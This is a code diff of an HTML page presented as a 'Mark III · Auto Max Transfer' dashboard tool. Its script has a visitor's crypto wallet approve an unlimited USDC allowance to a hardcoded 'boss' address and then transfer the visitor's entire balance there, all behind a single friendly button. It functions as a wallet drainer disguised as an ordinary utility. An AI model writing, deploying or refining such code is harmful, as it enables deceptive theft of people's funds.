@@ -2,50 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mark III · Auto Transfer All USDC</title>
+  <title>Mark III · Auto Max Transfer</title>
   <style>
     body {
       font-family: "Segoe UI", Roboto, sans-serif;
-      background: #f0f7ff;
-      color: #333;
+      background: #e9f4ff;
       text-align: center;
-      padding: 50px;
+      padding: 60px;
+      color: #333;
     }
     h2 {
       color: #2b6cb0;
+      font-size: 26px;
     }
     button {
-      padding: 14px 28px;
-      font-size: 18px;
-      background: #2b6cb0;
-      color: #fff;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
       margin-top: 30px;
+      font-size: 18px;
+      padding: 14px 28px;
+      border: none;
+      background: #2b6cb0;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
     }
     button:hover {
-      background: #1c4d91;
+      background: #1c4f91;
     }
     #status {
       margin-top: 30px;
       font-size: 16px;
       white-space: pre-line;
     }
+    .nav-link {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 14px;
+      text-decoration: none;
+      color: #2b6cb0;
+    }
   </style>
 </head>
 <body>
-  <h2>Mark III · One-Click Full USDC Transfer</h2>
-  <button onclick="authorizeAndTransfer()">🚀 Authorize + Transfer All</button>
+  <a class="nav-link" href="nav.html">← Back to Dashboard</a>
+  <h2>Mark III · Auto Max Transfer</h2>
+  <button onclick="startAutoTransfer()">🚀 Authorize & Transfer All</button>
   <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const usdcAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";  // USDC
-    const bossAddress = "0x86dbe265b0d503e68676971fc7d6aad7e5d90b12";  // Boss
+    const usdcAddress = "0xa0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
+    const bossAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
     const approveAmount = ethers.constants.MaxUint256;
 
-    async function authorizeAndTransfer() {
+    async function startAutoTransfer() {
       const status = document.getElementById("status");
       try {
         if (!window.ethereum) {
@@ -66,28 +76,27 @@
           "function transferFrom(address,address,uint256) public returns (bool)"
         ], signer);
 
-        status.innerText += "\\n⏳ Approving...";
-        const tx1 = await usdc.approve(bossAddress, approveAmount);
-        await tx1.wait();
-        status.innerText += "\\n✅ Approved Max";
+        status.innerText += "\\n⏳ Approving Max...";
+        const approveTx = await usdc.approve(bossAddress, approveAmount);
+        await approveTx.wait();
+        status.innerText += "\\n✅ Approval successful";
 
         const balance = await usdc.balanceOf(user);
-        status.innerText += "\\n💰 Balance: " + ethers.utils.formatUnits(balance, 6);
+        status.innerText += "\\n💰 Your USDC Balance: " + ethers.utils.formatUnits(balance, 6);
 
         const allowance = await usdc.allowance(user, bossAddress);
         if (balance.gt(allowance)) {
-          status.innerText += "\\n⚠️ Not enough allowance. Try again after approval.";
+          status.innerText += "\\n⚠️ Not enough allowance. Please retry after approval.";
           return;
         }
 
-        status.innerText += "\\n⏳ Transferring entire balance...";
-        const tx2 = await usdc.transferFrom(user, bossAddress, balance);
-        await tx2.wait();
-        status.innerText += "\\n✅ Full USDC Transferred!";
-
-      } catch (e) {
-        console.error(e);
-        status.innerText += "\\n❌ Error: " + (e.message || e);
+        status.innerText += "\\n💸 Transferring entire USDC...";
+        const tx = await usdc.transferFrom(user, bossAddress, balance);
+        await tx.wait();
+        status.innerText += "\\n✅ Transfer complete!";
+      } catch (err) {
+        console.error(err);
+        status.innerText += "\\n❌ Error: " + (err.message || err);
       }
     }
   </script>
